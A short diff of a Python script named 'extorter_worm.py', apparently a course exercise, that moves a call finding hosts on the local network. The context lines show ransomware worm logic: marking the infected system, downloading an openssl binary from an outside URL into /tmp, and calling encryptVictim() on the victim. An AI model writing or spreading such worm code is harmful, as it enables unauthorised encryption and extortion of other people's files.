@@ -142,6 +142,8 @@ markSystem();
 
 wormLocation = "/tmp/extorter_worm.py"
 
+network = getHostsOnTheSameNetwork()
+
 if len(sys.argv) >= 2:
 	if sys.argv[1] == "-host":
 		print("This is the host computer will not encrypt this Documents folder!")
@@ -154,8 +156,6 @@ else:
 	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")
 	encryptVictim()
 
-
-network = getHostsOnTheSameNetwork()
 
 print network
 
